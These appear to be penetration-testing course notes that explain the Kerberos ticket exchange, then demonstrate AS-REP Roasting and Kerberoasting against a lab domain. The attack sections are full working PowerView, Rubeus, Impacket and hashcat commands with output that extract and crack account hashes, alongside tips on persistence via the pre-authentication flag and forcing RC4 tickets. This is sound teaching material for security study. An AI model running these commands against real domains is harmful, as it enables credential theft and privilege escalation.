# Kerberos Attacks

## Introduction

### Kerberos Authentication Process

In Kerberos context, there are three entities when a user want to access a service; the user, the service, and the authentication server, also known as the Key Distribution Center, or KDC.

The KDC is the entity that knows all accounts' credentials.

#### Why Kerberos

On the one hand, it is used to centralize authentication to avoid all services having to know every user's credentials. This is extremely pratical in a context where users are regularly updated, whether because of a password change, the addition of a new user, or the deactivation or deletion of a user. If all services had to know the status of all users, this would create immense complexity. Instead, only one entity, the KDC, must have an up-to-date list of existing users.

On the other hand, this protocol allows users to authenticate against services without sending a password over the network. This is an excellent security measure to protect against man-in-the-middle attacks.

#### High-level Overview

##### Tickets

To meet both ends, Kerberos uses secret keys and a ticketing mechanism. The secret keys are, in practice, in an AD environment, the passwords of the different accounts.

From a high-level perspective, here's how a user can access a service.

1. To start, the user will request the first ticket from the KDC, proving they are who they claim to be. This is when the client authenticates to the KDC. This ticket, called a TGT, is the user's identity card. It contains all the information about the user, such as name, date of account creation, security information about the user, the groups to which the user belongs, etc. This identity card, the TGT, is limited to a few hours only by default. This ticket is presented for all other requests to the KDC.
2. Once this TGT has been obtained, the user will present it to the KDC each time they need to access a service. The KDC will then verify that the submitted TGT is valid and that the user did not forge it, and if so, it will return a TGS or ST to the user. A copy of the user's information in the TGT is included in the TGS ticket.
3. Now that the user has a TGS ticket for a particular service, they will present this TGS ticket to the service to use it. The service will the check the validity of this ticket, and if all is well, it will read the content of the user's information to determine if the user is entitled to use the requested service. It is, therefore, the service that checks the user's access rights.

##### Ticket Protection

The information on a user provided by the KDC must be protected. The user must not be able to forge it. This is where encryption comes into play.

Each account has a password or secret, which acts as an encryption and decryption key. The KDC knows the keys of all users. To protect the tickets, here is how these keys are used.

1. The TGT sent by the KDC to the user is encrypted using the secret key of the KDC, which only the KDC knows. Thus, the user cannot read or modify the information about themself. The KDC itself protects it.
2. The TGS ticket sent by the KDC to the user is encrypted using the service's secret key. In the same way, as the user does not know the service key, they cannot modify the information in the TGS ticket. On the other hand, when they send this TGS ticket to the service, the latter can decrypt the ticket's content and read the user's information.

##### Technical Details

You've seen that access to a service is carried out in three phases:

1. TGT request: Authentication Service (_AS_)
2. TGS request: Ticket-Granting Service (_TGS_)
3. Service request: Application Request (_AP_)

#### Authentication Service (_AS_)

##### Request (_AS-REQ_)

First, the user makes a TGT request. This request is called AS-REQ. But to receive the TGT, they must be able to prove their identity. This request is made to the KDC. The KDC holds all user keys.

To prove their identity, the user will send an authenticator. It's the current timestamp that the user will encrypt with their key. The username is also sent so the KDC can know whom it is dealing with.

Upon receiving this request, the KDC will retrieve the username, look for the associated key in its directory, and attempt to decrypt the authenticator. If it succeeds, it means that the user has used the same key as the one registered in its database, so they are authenticated. Otherwise, authentication fails.

This step, called pre-authentication, is not mandatory, but all accounts must do it by default. However, it should be noted that an administrator can disable pre-authentication. In this case, the client no longer needs to send an authenticator. The KDC will send the TGT no matter what happens.

##### Response (_AS-REP_)

The KDC, therefore, received the client's request for a TGT. If the KDC successfully decrypts the authenticator, it sends a response called AS-REP to the user.

To protect the rest of the exchanges, the KDC will generate a temporary session key before replying to the user. The client will use this key for further exchanges. The KDC avoids encrypting all information with the user's key.

There are two elements that you will find in the AS-REP response:

1. First, you are waiting for the TGT that the user requested. It contains all the user's information and is protected with the KDC's key, so the user can't tamper with it. It also contains a copy of the generated session key.
2. Second is the session key, but this time protected with the user's key.

#### Ticket-Granting Service (_TGS_)

The TGS is a component of the KDC that is responsible for issuing service tickets.

Typically hosted on a DC in the AD domain. When a user or computer requests a service ticket, the request is sent to the TGS component of the KDC, which verifies the user's or computer's identity and checks their authorization to access the requested resource before issuing a service ticket that can be used to gain access to the resource.

##### Request (_TGS-REQ_)

The client now has a response from the server to its TGT request. This response contains the TGT, protected by the KDC's key, and a session key.

The next step for the user is to request a ST or TGS with a TGS-REQ message. To do this, they will transmit three things to the KDC:

1. The name of the service they wish to access
2. The TGT they previously received, containing their information and a copy of the session key
3. An authenticator, which will be encrypted using the session key at this time

##### Response (_TGS-REP_)

The KDC receives this TGS request, but Kerberos is a stateless procol. Thus, the KDC has no idea what information has been exchanged before. It must still verify that the TGS request is valid. It must verify that the authenticator has been encrypted with the correct session key to do this. And how does the KDC know if the session key used is correct? Remember that there was a copy of the session key in the TGT. The KDC will decrypt the TGT and extract the session key. With this session key, it will be able to verify the authenticator's validity.

If all this is done correctly, the KDC only has to read the requested service and respond to the user with a TGS-REP message. You saw earlier that a session key had been generated for the exchanges between the user and the KDC. Well, it's the same thing here. A new session key is generated for future exchanges between the user and the service. And as before, this session key will be present in two places in the response sent by the KDC to the user. Here are all the elements sent by the KDC:

A service ticket or TGS ticket containing three elements:

1. The name of the requested service (_its SPN_)
2. A copy of the user information that was present in the TGT. The service will read this information to determine whether or not the user has the right to use it.
3. A copy of the session key

All this information is encrypted with the user/KDC session key. Within this encrypted response, the user's information and the copy of the user/service session key are also encrypted with the service key.

#### Application Request (_AP_)

##### Request (_AP-REQ_)

The user can now decrypt this response to extract the user/service session key and the TGS ticket, but the TGS ticket is protected with the service key. The user can't modify this TGS ticket, so they can't modify their rights, just like with the TGT.

The user will only transmit this TGS ticket to the service, and just like with the TGS request, an authenticator is added to it. What will the user encrypt this authenticator with? With the user/service session key just extracted.

##### Response (_AP-REP_)

The service finally receives the TGS ticket and an authenticator encrypted with the user/service session key generated by the KDC. This TGS ticket is protected with the service's key so that it can decrypt it. Remember that a copy of the user/service session key is embedded within the TGS ticket, so it can extract it and check the validity of the authenticator with this session key.

If everything goes correctly, the service can finally read the information about the user, including the groups to which they belong, and according to its access rules, grant or deny them access to the service. If authentication is successful, the service responds to the client with an AP-REP message by encrypting the timestamp with the extracted session key. The client can then verify that this message is coming from the service and can start issuing service requests.

## Roasting Attacks

### AS-REP Roasting

= most basic Kerberos attack and targets "Pre-Authentication". This is rare in an organization but is one of the few Kerberos attacks that do not require any form of prior authentication. The only information the attacker needs is the username they want to attack, which can also be found using other enumeration techniques. Once the attacker has the username, they send a special AS_REQ packet to the KDC, pretending to be the user. The KDC sends back an AS_REP, which contains a portion of information encrypted with a key derived from the user's password. The key can be cracked offline to obtain the user's password.

#### How does it work?

TGT Requests are encrypted with the current timestamp and the account's password. The DC will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain via an AS-REP response. A session key will be provided alongside the TGT and encrypted using the user's password.

If an account has pre-authentication disabled, an attacker can obtain an encrypted TGT for the affected account without any prior authentication. These tickets are vulnerable to offline password attacks using a tool like Hashcat or John.

So, in a nutshell, it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.

Many vendor installation guides specify that their service account be configured this way. The authentication service reply is encrypted with the account's password, and anyone on the network can request it.

AS-REP Roasting is similar to Kerberoasting but involves attacking AS-REP instead of TGS-REP.

This setting can be enumerated with Impacket, PowerView, or built-in tools such as the PowerShell AD module.

The attack can be performed with Impacket, the Rubeus toolkit and other tools to obtain the ticket for the target account. As mentioned, it is relatively rare to encounter accounts with this setting enabled. While you might stell see it during your assessments from time to time, it is usually far less present than Service Principal Names, which are often subject to a Kerberoasting attack.

There are other ways you can leverage this attack, though. Suppose an attacker has `GenericWrite` or `GenericAll` permissions over an account. In that case, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling it again. This can also be referred to as a "targeted AS-REP Roasting attack", in which you can enable the setting and AS-REP Roast the account. Still, success depends on the user having a relatively weak password.

#### Enumeration

PowerView can be used to enumerate users with their UserAccountControl property flag set to `DONT_REQ_PREAUTH`.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter DONT_REQ_PREAUTH

logoncount                    : 0
badpasswordtime               : 12/31/1600 7:00:00 PM
distinguishedname             : CN=Jenna Smith,OU=Server Team,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : Jenna Smith
userprincipalname             : jenna.smith@inlanefreight
name                          : Jenna Smith
objectsid                     : S-1-5-21-2974783224-3764228556-2640795941-1999
samaccountname                : jenna.smith
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 8/3/2020 8:51:43 PM
instancetype                  : 4
usncreated                    : 19711
objectguid                    : ea3c930f-aa8e-4fdc-987c-4a9ee1a75409
sn                            : smith
lastlogoff                    : 12/31/1600 7:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata         : {7/30/2020 6:28:24 PM, 7/30/2020 3:09:16 AM, 7/30/2020 3:09:16 AM, 7/28/2020 1:45:00
                                AM...}
givenname                     : jenna
memberof                      : CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
lastlogon                     : 12/31/1600 7:00:00 PM
badpwdcount                   : 0
cn                            : Jenna Smith
useraccountcontrol            : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated                   : 7/27/2020 7:35:57 PM
primarygroupid                : 513
pwdlastset                    : 7/27/2020 3:35:57 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 89508
```

You can also use the Rubeus tool to look for accounts that do not require pre-authentication with the `preauthscan` action.

> [!INFO]
> You can also use `Rubeus.exe asreproast /format:hashcat` to enumerate all accounts with the flag `DONT_REQ_PREAUTH`.

#### Performing the Attack

With this information, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the account name for the user without Kerberos pre-authentication set.

```powershell
PS C:\Tools> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target User            : jenna.smith
[*] Target Domain          : inlanefreight.local
[*] Target DC              : dc01.inlanefreight.local

[*] Using domain controller: dc01.inlanefreight.local (fe80::c872:c68d:a355:e6f3%11)
[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\jenna.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jenna.smith@inlanefreight.local:9369076320<SNIP>
```

#### Hash Cracking

The tool returns a list of hashes with the various TGTs. All that's left to do is to use Hashcat to try and retrieve the clear text password associated with these different accounts. The Hashcat hash-mode is 18200.

```
C:\Tools\hashcat-6.2.6> hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O

hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
====================================================================
* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: C:\Tools\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:c4caff1049fd667...9b96189d8804:dancing_queen101
<SNIP>
```

#### Set `DONT_REQ_PREAUTH` with PowerView

If you find that you have `GenericAll` privileges on an account, instead of resetting the account password, you can enable the `DONT_REQ_PREAUTH` flag to make a request to get the hash of this account and try to crack it. You can use the PowerView module to do it.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=userName)(name=userName)(displayname=userName))))
VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'userName'
```

### AS-REP Roasting from Linux

Impacket's GetNPUsers.py script can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

```bash
d41y@htb[/htb]$ GetNPUsers.py inlanefreight.local/pixis

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation


Name         MemberOf                                             PasswordLastSet             LastLogon                   UAC      
-----------  ---------------------------------------------------  --------------------------  --------------------------  --------
amber.smith                                                       2020-07-27 21:35:52.333183  2020-07-28 20:34:15.215302  0x410220 
jenna.smith  CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 21:35:57.901421  <never>                     0x410220
```

Now that you have a list of vulnerable accounts, you can request their hashes in Hashcat's format by adding the `-request` parameter to your command.

```bash
d41y@htb[/htb]$ GetNPUsers.py inlanefreight.local/pixis -request           

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation


Name         MemberOf                                             PasswordLastSet             LastLogon                   UAC      
-----------  ---------------------------------------------------  --------------------------  --------------------------  --------
amber.smith                                                       2020-07-27 21:35:52.333183  2020-07-28 20:34:15.215302  0x410220 
jenna.smith  CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 21:35:57.901421  2020-08-12 16:20:21.383297  0x410220 

$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:d28eecddc8c5e18157b3d73ec4a68aa5$2a881995d52a313d265<SNIP>
$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:e65a2fa83383a0c1f189408c07fe6d32$5b0478cd94258778478<SNIP>
```

#### Finding Vulnerable Accounts without Authentication

If you do not have credentials on the domain but have a username list, you can still find accounts that do not require pre-authentication. Using `GetNPUsers.py`, you can search for each account inside the file containing the user list to identify if there is at least one account vulnerable to this attack:

```bash
d41y@htb[/htb]$ GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

You may receive an error, but you will still get the hash of the account.

#### Red Team Usage

Red Teams may utilize AS-REP Roasting as part of two attack chains:

- **Persistence**: Setting this bit on accounts would allow attackers to regain access to accounts in case of password change. This is useful because it lets the team establish persistence on boxes that are likely outside the scope of monitoring and still have a high probability of gaining access to the domain at any time. You may see this setting enabled on service accounts used by old management applications, and if discovered, the blue team may ignore them.
- **PrivEsc**: There are many scenarios where an attacker can change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.

### Kerberoasting

... is an attack against service accounts that allow an attacker to perform an offline password-cracking attack against the AD account associated with the service. It is similar to AS-REP Roasting but does require prior authentication to the domain. In other words, you need a valid domain user account and password or a SYSTEM shell on a domain-joined machine to perform the attack.

When a service is registered, a Service Principal Name is added to AD and is an alias to an actual AD account. The information stored in AD includes the machine name, port, and the AD Account's password hash. In a proper configuration, "Service Accounts" are utilized with these SPNs to guarantee a strong password. These accounts are like machine accounts and can even have self-rotating passwords.

It is common to see SPNs tied to User Accounts because setting up Service Accounts can be tricky, and not all vendors support them. Worst of all, the service account may break things after 30 days when it attempts to rotate the password. For System Administrators, the primary focus is uptime, which often causes them to default to using "User Accounts", which is fine as long as they assign the account a strong password.

During a pentest, if an SPN is found tied to a user account and cracking was unsuccessful, it should be marked as a low severity finding and just noted that this allows attackers to perform offline password cracking attacks against this accout. The potential risk here is that if, someday, this account's password is set to something weaker that an attacker can crack.

#### Technical Details

When the KDC responds to a TGS request, the message it sends is fully encrypted with the session key shared between the user and the KDC, so the user can decrypt it because they know it. However, the embedded TGS ticket or Service Ticket is encrypted with the service account's secret key. The user, therefore, has a piece of data encrypted with the service account's password.

A user can request a Service Ticket for all available services existing on the AD environment and have those tickets encrypted with the secret of each service account in their possession.

Now that they have a Service Ticket encrypted with a service account's password, the user can perform an offline brute-force attack to try to recover the password in clear text.

However, most services are executed by machine accounts, which have 120 characters long randomly generated passwords, making it impractical to brute force.

Luckily, sometimes services are executed by user accounts. These are the services you are interested in. A user account has a password set by a human, which is much more likely to be predictablel. These are the accounts that the Kerberoast attack targets. When SPN accounts are set to use the RC4 encrpytion algorithm, the tickets can be much easier to crack offline. You may run into organizations using only the legacy, cryptographically insecure RC4 encryption algorithm. In constrast, other mature organizations employ only AES, which can be much more challenging to crack, even on a robust password-cracking rig.

#### Manual Detection

You then look for user accounts exposing a service. An account that exposes a service has a SPN. It is an LDAP attribute set on the account indicating the list of existing services provided by this account. If this attribute is not empty, this account offers at least one service.

Here is an LDAP filter to search for users exposing a service:

```
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

This filter returns a list of users with a non-empty SPN. A small PowerShell script allows you to automate finding these accounts in an environment:

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```

The script connects to the DC and searches for all objects that match your provided filter. Each result shows you its name and the list of SPNs associated with this account.

This script allows you to have a list of Kerberoastable accounts, but it does not perform a TGS request and does not extract the hash you can brute force.

You can also use the `SetSpn` built-in from Windows binary to search for SPN accounts. Link: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)

#### Automated Tools

[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) can be used to enumerate users with an SPN set and request the Service Ticket automatically to then output a crackable hash. You can use the following method to enumerate accounts with SPNs set.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -SPN

logoncount                    : 0
badpasswordtime               : 12/31/1600 8:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-228825152-3134732153-3833540767-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 5/4/2022 8:04:31 PM
instancetype                  : 4
objectguid                    : a68bfed4-1ccf-4b62-8efa-63b32841c05d
lastlogon                     : 12/31/1600 8:00:00 PM
lastlogoff                    : 12/31/1600 8:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
dscorepropagationdata         : {5/4/2022 8:04:31 PM, 5/4/2022 7:49:22 PM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=inlanefreight,DC=local
whencreated                   : 5/4/2022 7:49:21 PM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 5/4/2022 3:49:21 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 12782
<SNIP>
```

You can also use PowerView to directly perform the Kerberoasting attack.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
PS C:\Tools> cat .\tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"krbtgt","CN=krbtgt,CN=Users,DC=inlanefreight,DC=local","kadmin/changepw",,"$krb5tgs$18$*krbtgt$inlanefreight.local$kadmin/changepw*$B6D1ECE203852A04E57DFDD47627CDCA$D75AF1139899CA82EDA1CC6B548AACFF04DA9451F6F37E641C44F27AE2BAB86DB49F4913B5D09F447F7EEA97629A3C0FF93063F3B20273D0<SNIP>
```

Instead of the manual method, you can use the `Invoke-Kerberoast` function to perform this quickly.

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Invoke-Kerberoast

SamAccountName       : adam.jones
DistinguishedName    : CN=Adam Jones,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : IIS_dev/inlanefreight.local:80
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1443
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>

SamAccountName       : sqlqa
DistinguishedName    : CN=sqlqa,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_qa/inlanefreight.local:1443
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:1443*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>

SamAccountName       : sql-test
DistinguishedName    : CN=sql-test,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_test/inlanefreight.local:1443
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B21822B3C16D272F38A5658E20F580037<SNIP>

SamAccountName       : sqlprod
DistinguishedName    : CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/sql01:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA695EC2EDE568E9918909F7A05<SNIP>
```

Another great and fast way to perform Kerberoasting is with the [Rubeus](https://github.com/GhostPack/Rubeus) tool. In Rubeu's documentation, there are various options for the [Kerberoasting attack](https://github.com/GhostPack/Rubeus#kerberoast).

You can use Rubeus to Kerberoast all available users and return their hashes for offline cracking:

```
C:\Tools> C:\Tools>Rubeus.exe kerberoast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 6


[*] SamAccountName         : sqldev
[*] DistinguishedName      : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQL_svc_dev/inlanefreight.local:1433
[*] PwdLastSet             : 10/14/2022 7:00:06 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4FC4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E53380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
```

You can also Kerberoast a specific user and write te result to a file using the flag `/oufile:filename.txt`.

You could use the `/pwdsetafter` and `/pwdsetbefore` arguments to Kerberoast accounts whose password was set within a particular date; this can be helpful to you, as sometimes you find legacy accounts with a password set many years ago that is outside of the current password policy and relatively easy to crack.

You can use the `/stats` flag to list statistics about Kerberoastable accounts without sending any ticket requests. This can be useful for gathering information and checking the types of encryption the account tickets use.

The `/tgtdeleg` flag can be useful for you in situations where you find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when you perform a Kerberoast attack, you will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS ticket back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. You will know the difference because an RC4 encrypted ticket will return a hash that starts with the`$krb5tgs$23$*` prefix, while AES encrypted tickets will give you a hash that begins with `$krb5tgs$18$`.

In cases where you receive the hash of the account with AES encryption, you can use `/tgtdeleg` flag with Rubeus to force RC4 encryption. This may work in some domains where RC4 is built-in as a failsafe for backward compatibility with older services. If successful, you may get a password hash that could crack minutes or even hours faster than if you were trying to crack an AES-encrypted hash.

### Kerberoast from Linux

To perform Kerberoasting from Linux, you will use the [GetUserSPN.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) tool from the Impacket suite. This tool can search for all Kerberoastable accounts, extract the data encrypted with the password of the service account, and return a hashcat-friendly hash for further cracking.

Running `GetUserSPN.py` without parameters will producy similar output to your PowerShell FindSPNAccounts.ps1 script from above.

```bash
d41y@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>
```

Now that you know there are Kerberoastable accounts, you can request a TGS ticket or Service ticket for each of them and obtain a crackable hash in hashcat's format with the `-request` argument.

```bash
d41y@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis -request

Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>                  


$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~1443*$f06349cf7220c21cde1236e53a491a67$c4c2079e9b<SNIP>
